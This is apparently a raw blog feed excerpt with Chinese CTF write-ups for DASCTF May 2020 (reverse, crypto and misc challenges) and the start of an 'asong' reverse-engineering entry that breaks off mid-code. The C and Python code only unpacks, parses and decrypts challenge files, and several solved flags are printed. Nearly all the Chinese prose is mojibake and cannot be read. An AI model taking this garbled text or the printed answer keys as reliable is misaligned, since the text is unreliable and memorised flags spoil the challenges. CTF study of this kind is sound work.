src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524100310951.png" alt="image-20200524100310951"></p></li><li><p>æ¥ä¸‹æ¥å°±æ˜¯å»æ–‡ä»¶å†…å®¹äº†. ä½†æ˜¯æ¯ä¸ªç¨‹åºéƒ½æ˜¯åŠ äº†upxå£³çš„, å—¯å—¯..å› ä¸ºä¸ä¼šå†™è„šæœ¬å¼€å§‹è¿˜æƒ³æƒ³ç€æ‰‹åŠ¨å»æ, è¢«803ä¸ªç¨‹åºåŠé€€.</p></li><li><p>ç„¶åç”¨Cè¯­è¨€å†™äº†ä¸€ä¸ªä¸€ä¸ª.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">83</span>; i &lt; <span class="number">804</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(a, <span class="string">"upx -d %d.exe"</span>, i);</span><br><span class="line">system(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524102949962.png" alt="image-20200524102949962"></p></li><li><p>ä¸‹é¢æå–æ¯ä¸ªç¨‹åºçš„ PEæ–‡ä»¶é‚£éƒ¨åˆ†çš„å†…å®¹. å¯æ˜¯æå®Œ, ä¿å­˜ä¸ºexeæ–‡ä»¶å, æ‰“ä¸å¼€â€¦idaéƒ½ä¸è¡Œ, çœ‹çœ‹äº†PEæ–‡ä»¶å†…å®¹å‘ç°åŒºæ®µéƒ½æ²¡æœ‰â€¦â€¦.</p></li><li><p>é‚£å°±æå–çš„å†…å®¹æœ‰é—®é¢˜, å¤šçœ‹äº†å‡ ä¸ªåŸæ¥çš„exeæ–‡ä»¶, å‘ç°æœç„¶ä¸ä¸€æ ·, æœ‰çš„æå–å†…å®¹çš„ä½ç½®ä¸ä¸€æ ·. ä½†803ä¸ªexeè®©æˆ‘æ€ä¹ˆæ‰¾â€¦</p></li><li><p>å¼€å§‹æ‰¾è§„å¾‹. åˆ—ä¸¾äº†å¾ˆå¤šè¿˜æ˜¯æ²¡å‘ç°. è¿™ä¹Ÿæ˜¯æœ¬é¢˜èŠ±è´¹æ—¶é—´æœ€å¤šçš„åœ°æ–¹â€¦â€¦..æ ¹æ®exeæ–‡ä»¶çš„å­—èŠ‚å¤§å°æ¥åŒºåˆ†â€¦æ”¹äº†ä¸€ä¸‹æå–å†…å®¹çš„ç¨‹åº.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, n = <span class="number">779</span>, j = <span class="number">0</span>, lenth = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">4000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> filename[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(filename, <span class="string">"%d.exe"</span>, j++);</span><br><span class="line">fp = fopen(filename, <span class="string">"rb"</span>);</span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">lenth = ftell(fp);</span><br><span class="line"><span class="keyword">if</span>(lenth == <span class="number">0xBDF1</span>)</span><br><span class="line">&#123;</span><br><span class="line">fseek(fp, <span class="number">0x1c20</span>, <span class="number">0</span>);</span><br><span class="line">fread(a, <span class="number">1</span>, <span class="number">0x20</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X"</span>, a[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">fseek(fp, <span class="number">0x1C40</span>, <span class="number">0</span>);</span><br><span class="line">fread(a, <span class="number">1</span>, <span class="number">0x40</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">63</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X"</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ä»ç„¶æ‰“ä¸å¼€, ä½†æ˜¯è¿™æ¬¡åŒºæ®µéƒ½æ˜¯é½çš„, idaå¯ä»¥æ‰“å¼€å°±å¥½äº†. </p></li><li><p>è½½å…¥ida, å‘ç°æœ‰å¾ˆå¤šå¹²æ‰°é¡¹, ä½†å¯ä»¥åœ¨æ¯”è¾ƒå‡½æ•°ä¸Šé¢ä¸€ä¸ªçœ‹å‡ºæ˜¯ base64åŠ å¯†. æœ€åä¸å¯†æ–‡æ¯”è¾ƒ.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524101529508.png" alt="image-20200524101529508"></p></li><li><p>æ‰¾å¯†æ–‡. å¯ä»¥å‘ç°æ˜¯ç¨‹åºè¿è¡Œæ‰èµ‹å€¼çš„.</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524101634787.png" alt="image-20200524101634787"></p></li><li><p>æå–å‡ºæ¥baseè§£å¯†ä¸€ä¸‹, å†md5å¾—åˆ°flag. <strong>e801bcbcc42d3120d910ccc46ae640dd</strong></p></li><li><p>æ€»ç»“: ç®—æ˜¯ç†Ÿæ‚‰äº†æ–‡ä»¶æ“ä½œå§.å“ˆ</p></li></ul><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bbcrypto"><a href="#bbcrypto" class="headerlink" title="bbcrypto"></a>bbcrypto</h3><ul><li><p>ç”±äºpythonæ¥è§¦çš„å¾ˆå°‘ï¼Œåšäº†ä¸€ä¸ªå¯†ç å­¦çš„æ„Ÿè§‰åƒæ˜¯åœ¨å­¦pythonã€‚ä¸æ–­æŸ¥è¯­æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> A,SALT</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m, a, si)</span>:</span></span><br><span class="line"></span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</span><br><span class="line"></span><br><span class="line">        c+=hex(((ord(m[i])) * a + ord(next(si))) % <span class="number">128</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>)  <span class="comment">#ä¸è¶³2ä½ä»¥0å¡«å……ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    m = <span class="string">'flag&#123;********************************&#125;'</span></span><br><span class="line"></span><br><span class="line">    a = A</span><br><span class="line"></span><br><span class="line">    salt = SALT</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>(len(salt)==<span class="number">3</span>) <span class="comment">#assertç›¸å½“äºä¸€ä¸ªåˆ¤æ–­è¡¨è¾¾å¼ï¼Œè‹¥æ‹¬å·ä¸­è¡¨è¾¾å¼ä¸æˆç«‹åˆ™é€€å‡ºã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>(salt.isalpha()) <span class="comment">#æ£€æŸ¥æ˜¯å¦æ˜¯å­—æ¯</span></span><br><span class="line"></span><br><span class="line">    si = cycle(salt.lower()) <span class="comment">#cycleæŠŠå­—ç¬¦ä¸²saltå˜æˆä¸€ä¸ªå¾ªç¯ï¼Œç›¸å½“äº si[i++%3];</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"æ˜æ–‡å†…å®¹ä¸ºï¼š"</span>)</span><br><span class="line"></span><br><span class="line">    print(m)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š"</span>)</span><br><span class="line"></span><br><span class="line">    c=encrypt(m, a, si)</span><br><span class="line"></span><br><span class="line">    print(c)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d</span></span><br></pre></td></tr></table></figure></li><li><p>ä»é¢˜ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒAä¸saltæœªçŸ¥ï¼Œä½†æ˜¯saltç»™å‡ºäº†é™åˆ¶ï¼Œå¿…é¡»å­—æ¯ä¸”3ä½ã€‚</p></li><li><p>åˆçŸ¥é“flagçš„æ ¼å¼ <strong>flag{ }</strong>ï¼Œé‚£ç»“åˆå¯†æ–‡ä¸åŠ å¯†è¡¨è¾¾å¼ï¼Œç›´æ¥åˆ—æ–¹ç¨‹åŠ çˆ†ç ´è§£å‡ºæœªçŸ¥é‡å³å¯ã€‚</p></li><li><p>è®°å¾—å½“æ—¶è§£å‡º A  = 57. si = â€œahhâ€. å¼€å§‹è§£å¯†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, lenth = <span class="built_in">strlen</span>(a), sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> c[<span class="number">3</span>] = &#123;<span class="number">97</span>, <span class="number">104</span>, <span class="number">104</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt;= <span class="number">97</span> &amp;&amp; a[i] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i] &gt;= <span class="number">65</span> &amp;&amp; a[i] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] -= <span class="number">48</span>; </span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">97</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">65</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">48</span>;</span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i+<span class="number">1</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b[j++] = sum, sum = <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">38</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">33</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i*<span class="number">57</span> + c[j%<span class="number">3</span>])%<span class="number">128</span> == b[j])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, i); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>flag: flag{ad7d973ffdd285b476a1a727b3a8fbc4}</strong></p></li></ul><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Questionaire"><a href="#Questionaire" class="headerlink" title="Questionaire"></a>Questionaire</h3><ul><li>å¼€å§‹ç½‘ç«™å§‹ç»ˆæ‰“ä¸å¼€ï¼Œå› ä¸ºæ²¡æ¥è§¦è¿‡webï¼Œå§‹ç»ˆè®¤ä¸ºæ˜¯è€ƒwebçš„çŸ¥è¯†ã€‚</li><li>åé¢æƒ³ç€æŒ‚vpnè¯•è¯•ã€‚æ‰“å¼€äº†ï¼Œå¾ˆå¤šåˆéš¾æ€§é—®é¢˜ï¼Œç›´æ¥æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæ‰¾åˆ°å¯¹åº”ç­”æ¡ˆå³å¯ã€‚</li></ul><h3 id="bin-cat-2"><a href="#bin-cat-2" class="headerlink" title="/bin/cat 2"></a>/bin/cat 2</h3><ul><li>å¾—åˆ°ä¸€å¼  gif å›¾ç‰‡ï¼Œ è¿˜æ˜¯è€åŠæ³•æ”¾åœ¨ stegesolve å·¥å…·ä¸­çœ‹çœ‹ã€‚</li><li>å¼€å§‹çœ‹äº†å¥½å‡ åœˆä¹Ÿæ²¡çœ‹å‡ºä»€ä¹ˆåå ‚ï¼Œä¹Ÿæ˜¯å¾ˆä¹…äº†ï¼Œåœ¨red planeçš„é¡µé¢å‘ç°å¾ˆåƒä¸€ä¸ªäºŒç»´ç ï¼Œå¸¦ç€è¯•ä¸€è¯•ç”¨å·¥å…·æˆªå–äº†ä¸‹æ¥ã€‚</li><li>ä½¿ç”¨ PsQREdit 2.4.3 çœŸçš„å¾—åˆ°äº† flag.  å…·ä½“é¢˜æ²¡æœ‰ä¿ç•™ä¸‹æ¥ã€‚</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse:&quot;&gt;&lt;/a&gt;Reverse:&lt;/h2&gt;&lt;h3 id=&quot;ViQinere&quot;&gt;&lt;a href=&quot;#ViQinere&quot; class=&quot;headerlink&quot; title=&quot;ViQinere&quot;&gt;&lt;/a&gt;ViQinere&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;64ä½elfæ–‡ä»¶, è½½å…¥idaåå‘ç°ä¸ä»¥å¾€çš„ä¸åŒ. å¾ˆå¤šå‡½æ•°éƒ½æ²¡æ˜¾ç¤ºå‡ºæ¥.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;linuxä¸­è¿è¡Œä¸€ä¸‹, æ˜¾ç¤ºå¯¹flagåŠ å¯†, ç„¶åæ˜¯ä¸€äº›ä¹±ç .  åæ¥ç¾¤é‡Œé€šçŸ¥, è¿™ä¸ªæ˜¯æœ‰é¶æœºçš„.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ncè¿æ¥ä¸€ä¸‹, é‚£é¢˜ç›®çš„flagå°±æ˜¯å­˜æ”¾åœ¨æœ¬åœ°çš„, æ–‡ä»¶æ“ä½œå–å‡ºflag, ç»è¿‡åŠ å¯†. &lt;img src=&quot;/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200523203121150.png&quot; alt=&quot;image-20200523203121150&quot;&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="CTFçº¿ä¸Š" scheme="https://www.Bxnop.cn/categories/CTF%E7%BA%BF%E4%B8%8A/"/>
    
    
  </entry>
  
  <entry>
    <title>re æ”»é˜²ä¸–ç•Œï¼ˆ4ï¼‰</title>
    <link href="https://www.bxnop.cn/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/"/>
    <id>https://www.bxnop.cn/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/</id>
    <published>2020-05-15T02:27:16.000Z</published>
    <updated>2020-06-03T06:53:44.906Z</updated>
    
    <content type="html"><![CDATA[<h2 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h2><blockquote><p>è‡ªå·±ç®—æ³•ä¸åˆ°å®¶ï¼Œé€†å‘è¿™ä¸ªç®—æ³•æƒ³åŠå¤©ğŸ˜…</p></blockquote><h3 id="0x1åˆ†æ"><a href="#0x1åˆ†æ" class="headerlink" title="0x1åˆ†æ"></a>0x1åˆ†æ</h3><ul><li><p>ä¸‹è½½ä¸‹æ¥ä¸‰ä¸ªæ–‡ä»¶ã€‚</p></li><li><p>ä¾æ¬¡çœ‹äº†ä¸‹, ä¸€ä¸ª64ä½elfæ–‡ä»¶æ— å£³, 2ä¸ªæ–‡æœ¬æ–‡ä»¶.  æ‰“å¼€æ–‡æœ¬æ–‡ä»¶å,æ²¡æœ‰å¤´ç»ª.  å°†elfæ–‡ä»¶è½½å…¥idaã€‚</p></li><li><p>æ•´ä¸ªæµç¨‹å¼€å§‹çœ‹ä¸æ¸…æ¥šåšä»€ä¹ˆ, å¤šçœ‹å‡ æ¬¡æ˜ç™½äº†. å…ˆè¾“å…¥å­—ç¬¦ä¸², æ‰“å¼€ä¸€ä¸ªthat_girlæ–‡ä»¶è¯»ä¿¡æ¯, æœ€åå‘outæ–‡ä»¶å†™ä¿¡æ¯. ä½†è¿™æ€ä¹ˆå’Œflagè”ç³»èµ·æ¥å‘¢.  å…¶å®é‚£ä¸ªoutæ–‡ä»¶é‡Œçš„å°±æ˜¯å¯†æ–‡, æˆ‘ä»¬æ‰¾åˆ°é€†å‘ç®—æ³•, é€šè¿‡å¯†æ–‡æ±‚å‡ºæ˜æ–‡(å³æˆ‘ä»¬çš„è¾“å…¥, ä¹Ÿæ˜¯flag) <a id="more"></a></p></li><li><p>ä¸‹é¢å…·ä½“åˆ†ææ¯ä¸ªå‡½æ•°. ç¬¬ä¸€å‡½æ•°: <strong>sub_400B4C</strong> ç”±äºå¾ˆç®€å•, ç›´æ¥ç»™å‡ºå‡½æ•°åŠŸèƒ½.</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515112040201-1591166378815.png" alt="image-20200515112040201"></p></li><li><p><strong>sub_400B4C</strong>: å…ˆåˆ¤æ–­, å†å– { } ä¹‹é—´çš„å†…å®¹.</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515112333168-1591166382914.png" alt="image-20200515112333168"></p></li><li><p>ä¸‹é¢ä¸‹ä¸€ä¸ªå‡½æ•°, ä¹Ÿæ˜¯æˆ‘é‡åˆ°çš„éš¾ç‚¹å¼€å§‹:  <strong>v4å“ªé‡Œæ¥çš„åŠ ++*(_DWORD *)(4LL * v2 + v4);è¯­å¥çš„ä½œç”¨</strong></p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515113837252-1591166387143.png" alt="image-20200515113837252"></p><p><strong>sub_400936(&amp;buf)</strong>:</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515170301682-1591166983676.png" alt="image-20200515170301682"></p></li><li><p>ç¬¬ä¸€æ¬¡é‡åˆ°, æ²¡æœ‰ç»éªŒ, åæ¥æ‰æƒ³åˆ°é€šè¿‡æ±‡ç¼–çš„æŸ¥çœ‹, v4å³æ˜¯æˆ‘ä»¬ä¼ äº†å‚æ•° a2(ä¹Ÿå°±æ˜¯ä¸»å‡½æ•°çš„v3), è¿™æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’. 64ä½ä¸32ä½ç¨‹åºçš„åŒºåˆ«. ä½†è¯¥è¯­å¥åŠŸèƒ½è¿˜ä¸æ˜¯å¾ˆæ¸…æ¥š.<img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515114501031-1591166391168.png" alt="image-20200515114501031"></p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515114755333-1591166411300.png" alt="image-20200515114755333"></p></li><li><p>ç»§ç»­çœ‹ä¸‹ä¸€ä¸ªå‡½æ•°<strong>sub_400E54</strong>:  çœ‹åˆ°è¿™é‡Œ, å°±å¾ˆæ¸…æ™°äº†,  å°±æ˜¯å…ˆé€šè¿‡ç»Ÿè®¡<strong>that_girl</strong>æ–‡ä»¶ä¸­æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°, ç„¶åæŒ‰ç…§ä¸€å®šçš„é¡ºåºè¾“å…¥å­—ç¬¦, æŠŠæ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°æŒ‰ä¸€å®šé¡ºåºç»™ä¸‹é¢çš„ v5 æ•°ç»„èµ‹å€¼.<strong>é‚£æ‰€ä»¥sub_400936è½¬æ¢å­—ç¬¦å‡½æ•°æˆ‘ä»¬æ˜¯ä¸ç”¨ç®¡çš„.</strong></p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515115440782-1591166415194.png" alt="image-20200515115440782"></p></li><li><p>ä¸‹é¢æ˜¯2ä¸ªåŠ å¯†å‡½æ•°,  æˆ‘ç®—æ³•å¤ªèœ, é€†ç®—æ³•æƒ³åŠå¤©ğŸ˜…, é¦–å…ˆ<strong>sub_400D33((unsigned __int8 *)v5);</strong></p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515120938171-1591166420082.png" alt="image-20200515120938171"></p></li><li><p>ç„¶å <strong>sub_400DB4(v5, v4);</strong> è§£é‡Šèµ·æ¥æœ‰ç‚¹æŠ½è±¡â€¦â€¦æ³¨æ„æ˜¯ä¸€ä¸ªå­—èŠ‚, æ‰€ä»¥å¤šå‡ºçš„ä½è¦èˆå¼ƒ<img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515125253662-1591166423427.png" alt="image-20200515125253662"></p></li><li><p>ä¸¾ä¸ªä¾‹å­:</p><p><img src="/2020/05/15/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%884%EF%BC%89/image-20200515134001272-1591166447078.png" alt="image-20200515134001272"></p></li><li><p>æœ€åä¸€ä¸ªå‡½æ•°: <strong>sub_400CC0((__int64)v5, â€œoutâ€, v4);</strong>å°†åŠ å¯†åçš„å€¼å†™å…¥ outæ–‡ä»¶. </p></li></ul><h3 id="0x2é€†å‘è§£å¯†"><a href="#0x2é€†å‘è§£å¯†" class="headerlink" title="0x2é€†å‘è§£å¯†"></a>0x2é€†å‘è§£å¯†</h3><ul><li><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 